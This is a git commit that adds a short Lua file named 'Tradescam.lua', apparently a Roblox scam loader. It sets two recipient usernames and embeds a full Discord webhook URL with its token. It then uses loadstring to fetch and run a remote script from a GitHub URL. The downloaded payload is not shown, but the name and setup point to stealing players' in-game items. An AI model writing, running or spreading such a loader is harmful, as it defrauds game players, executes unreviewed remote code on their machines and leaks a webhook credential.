5c7a91fefde9d24e0af25e416dc51cca2f641b9a
Petsimulatotx <128840437+Petsimulatotx@users.noreply.github.com>
2023-03-25 15:22:36 +0800

    Create Tradescam.lua

---
+++ Tradescam.lua
@@ -0,0 +1,7 @@
+UserName = "zenn2344"
+
+UserName2 = "zenn2345"
+
+Webhook = "https://discord.com/api/webhooks/1088913040717651988/XBgxmshATCbU3wCt4SbbiniovbSANnCFjG5_1h7HtPd9aXjhXVz5GIyebMqMaPkABoIG"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
